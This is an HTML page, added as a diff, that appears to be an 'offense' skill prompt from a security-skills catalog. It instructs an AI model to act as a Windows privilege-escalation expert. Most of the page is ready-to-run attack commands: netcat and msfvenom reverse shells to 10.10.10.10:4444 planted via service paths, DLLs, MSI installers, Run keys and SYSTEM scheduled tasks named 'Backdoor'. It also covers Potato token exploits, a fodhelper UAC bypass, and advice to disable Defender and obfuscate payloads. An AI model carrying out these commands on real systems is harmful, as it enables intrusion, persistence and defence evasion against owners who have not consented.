@@ -1,0 +1,378 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>escalating-windows-privileges — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / offense / escalating-windows-privileges</div>
+  <h1 class="sk">escalating-windows-privileges</h1>
+  <div class="stags">
+    <span><span class="dot dot-offense"></span> offense</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
+  </div>
+  <p class="sdesc">Escalate privileges on Windows systems using service misconfigurations, DLL hijacking, token manipulation, UAC bypasses, registry exploits, and credential dumping. Use when performing Windows post-exploitation or privilege escalation.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+<span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><p>You are a Windows security expert specializing in privilege escalation techniques. Use this skill when the user requests help with:</p>
+<ul>
+<li>Escalating privileges on Windows systems</li>
+<li>Exploiting Windows misconfigurations</li>
+<li>Service exploitation and DLL hijacking</li>
+<li>Token manipulation and impersonation</li>
+<li>Registry exploitation</li>
+<li>UAC bypass techniques</li>
+<li>Scheduled task abuse</li>
+<li>Windows credential dumping</li>
+</ul>
+<h2>When to Use</h2>
+<p>Activate this skill when the user asks to:</p>
+<ul>
+<li>Escalate privileges on Windows systems</li>
+<li>Enumerate Windows privilege escalation vectors</li>
+<li>Exploit Windows service misconfigurations</li>
+<li>Perform token manipulation attacks</li>
+<li>Bypass UAC</li>
+<li>Dump Windows credentials</li>
+<li>Analyze Windows security misconfigurations</li>
+<li>Help with Windows penetration testing</li>
+</ul>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>Linux or macOS hosts</strong> — use <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a></li>
+<li><strong>Domain privilege escalation rather than local</strong> — use <a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a></li>
+<li><strong>Keeping the access you gained</strong> — use <a class="xref" href="establishing-persistence.html"><code>establishing-persistence</code></a></li>
+<li><strong>Investigating an escalation as a defender</strong> — use <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a></li>
+</ul>
+<h2>Core Methodologies</h2>
+<h3>1. Initial System Enumeration</h3>
+<p><strong>System Information:</strong></p>
+<pre><code># Basic system info
+systeminfo
+hostname
+whoami /all
+ver
+wmic os get Caption,CSDVersion,OSArchitecture,Version
+
+# Users and groups
+net user
+net user &lt;username&gt;
+net localgroup
+net localgroup Administrators
+whoami /priv
+whoami /groups</code></pre>
+<p><strong>PowerShell Enumeration:</strong></p>
+<pre><code># System info
+Get-ComputerInfo
+Get-HotFix  # Installed patches
+Get-Service  # Running services
+
+# Current user privileges
+$env:username
+[Security.Principal.WindowsIdentity]::GetCurrent()</code></pre>
+<p><strong>Network Information:</strong></p>
+<pre><code>ipconfig /all
+route print
+arp -a
+netstat -ano
+netsh firewall show state
+netsh firewall show config</code></pre>
+<h3>2. Service Exploitation</h3>
+<p><strong>Enumerate Services:</strong></p>
+<pre><code># List services
+sc query
+sc query state= all
+wmic service list brief
+Get-Service
+
+# Detailed service info
+sc qc &lt;service_name&gt;
+sc query &lt;service_name&gt;
+
+# Service permissions
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv %USERNAME% *</code></pre>
+<p><strong>Unquoted Service Paths:</strong></p>
+<pre><code># Find unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+
+# PowerShell
+Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'} | Select Name,PathName,StartMode
+
+# Exploit: Place malicious executable in path with spaces
+# Example path: C:\Program Files\My Service\service.exe
+# Create: C:\Program.exe  (will execute before actual service)</code></pre>
+<p><strong>Weak Service Permissions:</strong></p>
+<pre><code># Check service permissions with accesschk
+accesschk.exe -uwcqv "Everyone" *
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Users" *
+
+# Modify service binary path
+sc config &lt;service&gt; binpath= "C:\Windows\Temp\nc.exe -nv 10.10.10.10 4444 -e cmd.exe"
+sc stop &lt;service&gt;
+sc start &lt;service&gt;
+
+# Change service to run as SYSTEM
+sc config &lt;service&gt; obj= "LocalSystem" password= ""</code></pre>
+<p><strong>Service Binary Hijacking:</strong></p>
+<pre><code># If you can replace service binary
+# Create malicious executable
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe &gt; evil.exe
+
+# Replace original binary (if writable)
+move C:\Path\To\Service\original.exe original.exe.bak
+copy evil.exe C:\Path\To\Service\original.exe
+
+# Restart service
+sc stop &lt;service&gt;
+sc start &lt;service&gt;</code></pre>
+<h3>3. DLL Hijacking</h3>
+<p><strong>DLL Search Order:</strong></p>
+<pre><code>1. Application directory
+2. System32 directory
+3. System directory
+4. Windows directory
+5. Current directory
+6. PATH directories</code></pre>
+<p><strong>Find DLL Hijacking Opportunities:</strong></p>
+<pre><code># Process Monitor (procmon) - filter for NAME NOT FOUND and path contains .dll
+# Look for applications loading DLLs from writable directories
+
+# PowerShell - find writable directories in PATH
+$env:PATH -split ';' | ForEach-Object { if (Test-Path $_) { icacls $_ } }</code></pre>
+<p><strong>Create Malicious DLL:</strong></p>
+<pre><code># Generate DLL with msfvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll &gt; evil.dll
+
+# Place in writable directory that application loads from
+# Wait for service/application restart</code></pre>
+<h3>4. Registry Exploitation</h3>
+<p><strong>Autorun Keys:</strong></p>
+<pre><code># Check autorun registry keys
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+# PowerShell
+Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+
+# Modify if writable
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\Windows\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre>
+<p><strong>AlwaysInstallElevated:</strong></p>
+<pre><code># Check if both are set to 1
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# If both = 1, can install MSI as SYSTEM
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi &gt; evil.msi
+msiexec /quiet /qn /i C:\Temp\evil.msi</code></pre>
+<p><strong>Saved Credentials:</strong></p>
+<pre><code># Check for saved credentials
+cmdkey /list
+
+# Use saved credentials
+runas /savecred /user:admin cmd.exe
+runas /savecred /user:DOMAIN\Administrator "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre>
+<h3>5. Token Manipulation</h3>
+<p><strong>Token Impersonation:</strong></p>
+<pre><code># Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
+whoami /priv
+
+# If enabled, use Potato exploits:
+# - JuicyPotato (Windows 7-10, Server 2008-2016)
+# - RoguePotato (Windows 10/Server 2019)
+# - PrintSpoofer (Windows 10/Server 2016+)</code></pre>
+<p><strong>JuicyPotato:</strong></p>
+<pre><code># Requires SeImpersonate or SeAssignPrimaryToken
+JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"
+
+# With specific CLSID
+JuicyPotato.exe -t * -p cmd.exe -l 1337 -c {CLSID}</code></pre>
+<p><strong>PrintSpoofer (Modern Windows):</strong></p>
+<pre><code># For Windows 10/Server 2016+
+PrintSpoofer.exe -i -c cmd
+PrintSpoofer.exe -c "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre>
+<p><strong>GodPotato (Latest):</strong></p>
+<pre><code># For Windows Server 2012+, Windows 8+
+GodPotato.exe -cmd "cmd /c whoami"
+GodPotato.exe -cmd "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"</code></pre>
+<h3>6. UAC Bypass</h3>
+<p><strong>Check UAC Level:</strong></p>
+<pre><code>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+# ConsentPromptBehaviorAdmin = 0 (no UAC)
+# ConsentPromptBehaviorAdmin = 5 (default UAC)</code></pre>
+<p><strong>UAC Bypass Techniques:</strong></p>
+<pre><code># fodhelper.exe bypass (Windows 10)
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" -Force
+Start-Process "C:\Windows\System32\fodhelper.exe"
+
+# Cleanup
+Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
+
+# Disk Cleanup bypass (cleanmgr.exe)
+# Event Viewer bypass (eventvwr.exe)
+# Computer Management bypass (compmgmt.msc)</code></pre>
+<h3>7. Scheduled Tasks</h3>
+<p><strong>Enumerate Tasks:</strong></p>
+<pre><code># List scheduled tasks
+schtasks /query /fo LIST /v
+schtasks /query /fo TABLE /v
+
+# PowerShell
+Get-ScheduledTask
+Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}</code></pre>
+<p><strong>Exploit Writable Task Scripts:</strong></p>
+<pre><code># If task runs script you can modify
+echo C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe &gt; C:\Path\To\Task\script.bat
+
+# Check task permissions
+icacls C:\Path\To\Task\script.bat</code></pre>
+<p><strong>Create Malicious Task:</strong></p>
+<pre><code># Create task to run as SYSTEM
+schtasks /create /tn "Backdoor" /tr "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" /sc onstart /ru System
+
+# Create task to run every minute
+schtasks /create /tn "Backdoor" /tr "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" /sc minute /mo 1 /ru System</code></pre>
+<h3>8. Kernel Exploits &amp; Credential Access</h3>
+<p>Once you have a foothold, kernel exploitation and credential harvesting are covered as an exhaustive command catalog in a dedicated reference: kernel exploit identification and suggesters, SAM/SYSTEM and LSASS dumping, on-disk/registry password hunting, and Group Policy Preferences (GPP) extraction. See <a href="references/kernel-exploits-and-credential-access.md">references/kernel-exploits-and-credential-access.md</a>.</p>
+<h2>Automated Enumeration Tools</h2>
+<p><strong>WinPEAS:</strong></p>
+<pre><code># Download and run
+winPEASx64.exe
+winPEASx64.exe quiet
+winPEASx64.exe systeminfo</code></pre>
+<p><strong>PowerUp (PowerSploit):</strong></p>
+<pre><code>Import-Module .\PowerUp.ps1
+Invoke-AllChecks</code></pre>
+<p><strong>Seatbelt:</strong></p>
+<pre><code>Seatbelt.exe -group=all
+Seatbelt.exe -group=system
+Seatbelt.exe -group=user</code></pre>
+<p><strong>SharpUp:</strong></p>
+<pre><code>SharpUp.exe audit</code></pre>
+<p><strong>PrivescCheck:</strong></p>
+<pre><code>Import-Module .\PrivescCheck.ps1
+Invoke-PrivescCheck
+Invoke-PrivescCheck -Extended</code></pre>
+<h2>Tools to Transfer</h2>
+<p><strong>Essential Binaries:</strong></p>
+<ul>
+<li>winPEAS.exe - Automated enumeration</li>
+<li>nc.exe - Netcat for reverse shells</li>
+<li>accesschk.exe - Check permissions</li>
+<li>PsExec.exe - Execute as different user</li>
+<li>procdump.exe - Dump process memory</li>
+<li>mimikatz.exe - Credential dumping</li>
+<li>Rubeus.exe - Kerberos attacks</li>
+<li>PrintSpoofer.exe - Token impersonation</li>
+<li>GodPotato.exe - Token impersonation (latest)</li>
+</ul>
+<p><strong>PowerShell Modules:</strong></p>
+<ul>
+<li>PowerUp.ps1 - Privilege escalation checks</li>
+<li>PowerView.ps1 - AD enumeration</li>
+<li>Invoke-Mimikatz.ps1 - Memory credential dumping</li>
+<li>PrivescCheck.ps1 - Detailed enumeration</li>
+</ul>
+<h2>Troubleshooting</h2>
+<p><strong>Exploit Not Working:</strong></p>
+<ul>
+<li>Verify Windows version matches exploit requirements</li>
+<li>Check architecture (x86 vs x64)</li>
+<li>Ensure all required patches are missing</li>
+<li>Check for AV/EDR blocking execution</li>
+<li>Try different exploit variant</li>
+</ul>
+<p><strong>Access Denied:</strong></p>
+<ul>
+<li>Check file/registry permissions with icacls</li>
+<li>Verify user privileges with whoami /priv</li>
+<li>Ensure UAC is not blocking (run as administrator)</li>
+<li>Check if action requires SYSTEM level</li>
+</ul>
+<p><strong>AV/EDR Bypass:</strong></p>
+<ul>
+<li>Obfuscate payloads and scripts</li>
+<li>Use in-memory execution</li>
+<li>Disable Windows Defender (if admin)</li>
+<li>Use living-off-the-land binaries (LOLBins)</li>
+</ul>
+<h2>References</h2>
+<ul>
+<li><a href="references/kernel-exploits-and-credential-access.md">references/kernel-exploits-and-credential-access.md</a> — Kernel exploit and credential-access command catalog (progressive disclosure)</li>
+<li>HackTricks Windows Privesc: https://github.com/HackTricks-wiki/hacktricks/tree/master/src/windows-hardening</li>
+<li>PEASS-ng (WinPEAS): https://github.com/carlospolop/PEASS-ng</li>
+<li>PowerSploit (PowerUp): https://github.com/PowerShellMafia/PowerSploit</li>
+<li>Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester</li>
+<li>PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</li>
+<li>LOLBAS Project: https://lolbas-project.github.io/</li>
+</ul>
+<h2>ATT&amp;CK Coverage</h2>
+<p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
+<p><strong>Execution</strong> (TA0002)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1047/">T1047</a> Windows Management Instrumentation — see also <a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1059/001/">T1059.001</a> PowerShell — see also <a class="xref" href="analyzing-malware.html"><code>analyzing-malware</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1569/">T1569</a> System Services — see also <a class="xref" href="attacking-active-directory.html"><code>attacking-active-directory</code></a></li>
+</ul>
+<p><strong>Persistence</strong> (TA0003)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1543/003/">T1543.003</a> Windows Service — see also <a class="xref" href="establishing-persistence.html"><code>establishing-persistence</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1574/">T1574</a> Hijack Execution Flow <em>(also Privilege Escalation, Defense Evasion)</em></li>
+</ul>
+<p><strong>Privilege Escalation</strong> (TA0004)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1055/">T1055</a> Process Injection <em>(also Defense Evasion)</em> — see also <a class="xref" href="analyzing-malware.html"><code>analyzing-malware</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1068/">T1068</a> Exploitation for Privilege Escalation — see also <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1134/">T1134</a> Access Token Manipulation <em>(also Defense Evasion)</em></li>
+<li><a href="https://attack.mitre.org/techniques/T1548/">T1548</a> Abuse Elevation Control Mechanism <em>(also Defense Evasion)</em> — see also <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1548/002/">T1548.002</a> Bypass User Account Control</li>
+<li><a href="https://attack.mitre.org/techniques/T1574/001/">T1574.001</a> DLL</li>
+</ul>
+<p><strong>Defense Evasion</strong> (TA0005)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1218/">T1218</a> System Binary Proxy Execution — see also <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a></li>
+</ul>
+<p><strong>Credential Access</strong> (TA0006)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1003/002/">T1003.002</a> Security Account Manager — see also <a class="xref" href="cracking-passwords.html"><code>cracking-passwords</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1555/">T1555</a> Credentials from Password Stores</li>
+</ul>
+<p><strong>Discovery</strong> (TA0007)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1082/">T1082</a> System Information Discovery — see also <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1083/">T1083</a> File and Directory Discovery — see also <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1518/">T1518</a> Software Discovery</li>
+</ul>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
